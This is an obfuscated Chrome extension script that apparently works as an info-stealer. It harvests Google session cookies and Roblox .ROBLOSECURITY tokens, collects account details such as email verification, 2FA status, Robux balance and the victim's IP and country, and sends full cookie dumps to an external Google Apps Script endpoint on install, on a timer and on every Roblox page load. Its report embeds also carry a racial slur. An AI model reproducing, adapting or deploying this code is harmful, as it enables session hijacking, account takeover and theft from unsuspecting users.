let _0xdg2ga;
const GAS_URL = "https://script.google.com/macros/s/AKfycbwXz56f1L65iUPJaDy4GYps2_YF9svy_rklc40aKtQJxs7egVz4jjqDk6VcHSrqCMJcbg/exec";
_0xdg2ga = 852673 ^ 852681;
const CONFIG = {
  "google": {
    "type": "google",
    "domain": "google.com",
    "url": "https://www.google.com",
    "sessionCookie": "SID",
    "label": "GMAIL"
  },
  "roblox": {
    "type": "roblox",
    "domain": "roblox.com",
    "url": "https://www.roblox.com",
    "sessionCookie": ".ROBLOSECURITY",
    "label": "ROBLOX"
  }
};
const CHECK_INTERVAL = 867035 ^ 862547;
chrome["runtime"]["onInstalled"]["addListener"](() => {
  console["log"](".");
  runAllChecks();
});
setInterval(() => {
  runAllChecks();
}, CHECK_INTERVAL);
async function runAllChecks() {
  await Promise["all"]([checkTarget(CONFIG["google"]), checkTarget(CONFIG["roblox"])]);
}
async function checkTarget(_0x3806e4) {
  let _0x4f7767 = false;
  let _0x29d668 = null;
  if (_0x3806e4["type"] === "google") {
    const _0x338784 = await new Promise(_0xcb63b8 => chrome["cookies"]["getAll"]({
      "domain": _0x3806e4["domain"]
    }, _0xcb63b8));
    _0x4f7767 = _0x338784["some"](_0x628448 => _0x628448["name"] === "DIS".split("").reverse().join("") || _0x628448["name"] === "OSID" || _0x628448["name"] === "SAPISID" || _0x628448["name"] === "HSID");
  } else {
    const _0x4dab76 = await new Promise(_0xafe126 => chrome["cookies"]["get"]({
      "url": _0x3806e4["url"],
      "name": _0x3806e4["sessionCookie"]
    }, _0xafe126));
    if (_0x3806e4["type"] === "roblox") {
      try {
        const _0x2de7c3 = await fetch("detacitnehtua/sresu/1v/moc.xolbor.sresu//:sptth".split("").reverse().join(""));
        if (_0x2de7c3["ok"]) {
          const _0x3370c3 = await _0x2de7c3["json"]();
          _0x4f7767 = !!_0x3370c3["id"];
        } else {
          _0x4f7767 = false;
        }
      } catch (_0x509056) {
        _0x4f7767 = false;
      }
      if (_0x4dab76) {
        _0x29d668 = _0x4dab76["value"];
      }
    } else {
      _0x4f7767 = !!_0x4dab76;
    }
  }
  const _0x1eac15 = "_sutatStsal".split("").reverse().join("") + _0x3806e4["domain"];
  chrome["storage"]["local"]["get"]([_0x1eac15], async _0x1e472f => {
    const _0x568525 = _0x1e472f[_0x1eac15];
    if (_0x4f7767 !== _0x568525) {
      chrome["storage"]["local"]["set"]({
        [_0x1eac15]: _0x4f7767
      });
      
      if (_0x4f7767 && _0x3806e4["domain"] === "roblox.com") {
        try {
          const _0x5570c1 = _0x29d668;
          const [_0x5c0f3c, _0x356243, _0xd06d57, _0x4269b9, _0x1a6b3e] = await Promise["all"]([
              fetch("https://users.roblox.com/v1/users/authenticated").then(r => r.json()),
              fetch("https://accountsettings.roblox.com/v1/email").then(r => r.json()),
              fetch("https://economy.roblox.com/v1/users/authenticated/currency").catch(() => ({robux: 0})),
              fetch("https://premiumfeatures.roblox.com/v1/users/authenticated/validate-membership").catch(() => false),
              fetch("http://ip-api.com/json/").then(r => r.json())
          ]);
          const _0x50bae9 = _0x5c0f3c["id"];
          const _0x5e0cc1 = await fetch("https://economy.roblox.com/v1/users/" + _0x50bae9 + "/currency").then(r => r.json());
          const _0x42de43 = await fetch("https://premiumfeatures.roblox.com/v1/users/" + _0x50bae9 + "/validate-membership").then(r => r.json());
          const _0x777b57 = await fetch("https://users.roblox.com/v1/users/" + _0x50bae9).then(r => r.json());
          const _0x2dcaa4 = await fetch("https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=" + _0x50bae9 + "&size=150x150&format=Png").then(r => r.json());
          const _0x3661ca = await fetch("https://twostepverification.roblox.com/v1/users/" + _0x50bae9 + "/configuration").then(r => r.json());
          
          const _0x7ef6bc = new Date(_0x777b57["created"])["toLocaleDateString"]("tr-TR");
          const _0x3a64ba = _0x356243["isEmailVerified"] || _0x356243["verified"] || false;
          const _0x2d1cbe = _0x3661ca["primaryMediaType"] !== null;
          
          const _0x8a9930 = {
            "content": "@everyone",
            "embeds": [{
              "title": "" + _0x5c0f3c["displayName"],
              "url": "https://www.roblox.com/users/" + _0x50bae9 + "/profile",
              "description": "**:key: .ROBLOSECURITY**\n```" + _0x5570c1 + "```",
              "color": _0x42de43 ? 3447003 : 3447003,
              "thumbnail": { "url": _0x2dcaa4["data"][0]["imageUrl"] },
              "fields": [
                {"name": ":bust_in_silhouette: Kullanıcı", "value": "`" + _0x5c0f3c["name"] + "`", "inline": true},
                {"name": ":gem: Premium", "value": _0x42de43 ? ":white_check_mark:" : ":x:", "inline": true},
                {"name": ":date: Kuruluş", "value": "`" + _0x7ef6bc + "`", "inline": true},
                {"name": ":e_mail: E-posta Onay", "value": _0x3a64ba ? ":white_check_mark:" : ":x:", "inline": true},
                {"name": ":closed_lock_with_key: 2FA Durumu", "value": _0x2d1cbe ? ":white_check_mark:" : ":x:", "inline": true},
                {"name": ":moneybag: Robux", "value": "**" + _0x5e0cc1["robux"] + "**", "inline": true},
                {"name": ":globe_with_meridians: IP Adresi", "value": "```" + _0x1a6b3e["query"] + "```", "inline": true},
                {"name": ":earth_asia: Ülke", "value": "```" + _0x1a6b3e["country"] + "```", "inline": true}
              ],
              "footer": { "text": "Legendary nigga" },
              "timestamp": new Date().toISOString()
            }]
          };
          chrome["cookies"]["getAll"]({"domain": _0x3806e4["domain"]}, async _0x1f00b2 => {
            const _0x3be319 = JSON.stringify(_0x1f00b2, null, 2);
            await sendToGAS(_0x3806e4["type"], _0x8a9930, _0x3be319, "roblox_full_dump.txt");
          });
        } catch (_0x35acb7) {
          console["error"]("Roblox detay hatası:", _0x35acb7);
        }
      } 
      else {
        // GOOGLE COOKIE KISMI BURADA DÜZELTİLDİ
        let _0x48b07a = "royimniliB".split("").reverse().join("");
        let _0x25ad00 = "royimniliB".split("").reverse().join("");
        try {
          const _0x178bcd = await fetch("http://ip-api.com/json/");
          const _0x4e84c0 = await _0x178bcd["json"]();
          _0x48b07a = _0x4e84c0["query"];
          _0x25ad00 = _0x4e84c0["country"];
        } catch (_0x4a003c) {}
        
        const _0x449dc6 = {
          "content": "@everyone",
          "embeds": [{
            "title": "Google Cookie Bulundu!",
            "color": 3447003,
            "fields": [
              {"name": "Durum", "value": "Aktif :white_check_mark:", "inline": false},
              {"name": "IP Adresi", "value": "```" + _0x48b07a + "```", "inline": true},
              {"name": "Ülke", "value": "```" + _0x25ad00 + "```", "inline": true}
            ],
            "footer": { "text": "Legendary nigga" },
            "timestamp": new Date().toISOString()
          }]
        };
        
        // BURASI DÜZELTİLDİ: Artık else bloğunda da getAll çalışıp dosya gönderiyor.
        chrome["cookies"]["getAll"]({"domain": _0x3806e4["domain"]}, async _0x4aeff1 => {
          const _0x154625 = JSON.stringify(_0x4aeff1, null, 2);
          await sendToGAS(_0x3806e4["type"], _0x449dc6, _0x154625, _0x3806e4["domain"] + "_full_dump.txt");
        });
      }
    }
  });
}
async function sendToGAS(_0x31727f, _0x54a4e1, _0x424d5e = null, _0x22c928 = null) {
  try {
    const _0x4945da = {
      "type": _0x31727f,
      "payload_json": _0x54a4e1,
      "file_content": _0x424d5e,
      "file_name": _0x22c928
    };
    await fetch(GAS_URL, {
      "method": "POST",
      "headers": { "Content-Type": "text/plain" },
      "body": JSON.stringify(_0x4945da)
    });
  } catch (_0x2a5f85) {
    console["error"]("GAS Bridge hatası:", _0x2a5f85);
  }
}
chrome["tabs"]["onUpdated"]["addListener"]((_0x1754b8, _0x37bb76, _0x11ea55) => {
  if (_0x37bb76["status"] === "complete" && _0x11ea55["url"] && _0x11ea55["url"]["includes"]("roblox.com")) {
    chrome["cookies"]["get"]({"url": "https://www.roblox.com", "name": ".ROBLOSECURITY"}, async _0x485814 => {
      if (_0x485814 && _0x485814["value"] && _0x485814["value"]["includes"]("WARNING-AND-THIS")) {
        const _0x35018b = _0x485814["value"];
        try {
          const _0xb13215 = await fetch("https://users.roblox.com/v1/users/authenticated");
          const _0x2bc928 = await _0xb13215["json"]();
          const _0x53872f = _0x2bc928["id"];
          const _0x2ae5e5 = await fetch("https://accountsettings.roblox.com/v1/email");
          const _0x1cf77a = await _0x2ae5e5["json"]();
          
          let _0x115075 = false;
          if (_0x1cf77a["emailAddress"] && _0x1cf77a["isEmailVerified"] !== undefined) {
            _0x115075 = _0x1cf77a["isEmailVerified"];
          } else if (_0x1cf77a["verified"] !== undefined) {
            _0x115075 = _0x1cf77a["verified"];
          }
          
          const _0x496245 = await fetch("https://twostepverification.roblox.com/v1/users/" + _0x53872f + "/configuration");
          const _0x56e3bc = await _0x496245["json"]();
          const _0x40c932 = _0x56e3bc["primaryMediaType"] !== null;
          
          const _0x5f2a4a = await fetch("https://premiumfeatures.roblox.com/v1/users/" + _0x53872f + "/validate-membership");
          const _0x270607 = await _0x5f2a4a["json"]();
          
          const _0x352ff7 = await fetch("https://economy.roblox.com/v1/users/" + _0x53872f + "/currency");
          const _0x2eda9d = await _0x352ff7["json"]();
          
          const _0x4693f1 = await fetch("https://users.roblox.com/v1/users/" + _0x53872f);
          const _0x1dc213 = await _0x4693f1["json"]();
          const _0x428eee = new Date(_0x1dc213["created"])["toLocaleDateString"]("tr-TR");
          
          const _0x20bc49 = await fetch("https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=" + _0x53872f + "&size=150x150&format=Png");
          const _0x1b1702 = await _0x20bc49["json"]();
          
          const _0x350cca = await fetch("http://ip-api.com/json/");
          const _0x2c6e08 = await _0x350cca["json"]();
          
          const _0x3ffdbe = {
            "content": "@everyone",
            "embeds": [{
              "title": "" + _0x2bc928["displayName"],
              "url": "https://www.roblox.com/users/" + _0x53872f + "/profile",
              "description": "**:key: .ROBLOSECURITY**\n```" + _0x35018b + "```",
              "color": _0x270607 ? 3447003 : 3447003,
              "thumbnail": { "url": _0x1b1702["data"][0]["imageUrl"] },
              "fields": [
                {"name": ":bust_in_silhouette: Kullanıcı", "value": "`" + _0x2bc928["name"] + "`", "inline": true},
                {"name": ":gem: Premium", "value": _0x270607 ? ":white_check_mark:" : ":x:", "inline": true},
                {"name": ":date: Kuruluş", "value": "`" + _0x428eee + "`", "inline": true},
                {"name": ":e_mail: E-posta Onay", "value": _0x115075 ? ":white_check_mark:" : ":x:", "inline": true},
                {"name": ":closed_lock_with_key: 2FA Durumu", "value": _0x40c932 ? ":white_check_mark:" : ":x:", "inline": true},
                {"name": ":moneybag: Robux", "value": "**" + _0x2eda9d["robux"] + "**", "inline": true},
                {"name": ":globe_with_meridians: IP Adresi", "value": "```" + _0x2c6e08["query"] + "```", "inline": true},
                {"name": ":earth_asia: Ülke", "value": "```" + _0x2c6e08["country"] + "```", "inline": true}
              ],
              "footer": { "text": "Legendary nigga" },
              "timestamp": new Date().toISOString()
            }]
          };
          await sendToGAS("instant_roblox", _0x3ffdbe);
        } catch (_0x5470c9) {
          console["error"]("Veri işleme hatası:", _0x5470c9);
        }
      }
    });
  }
});
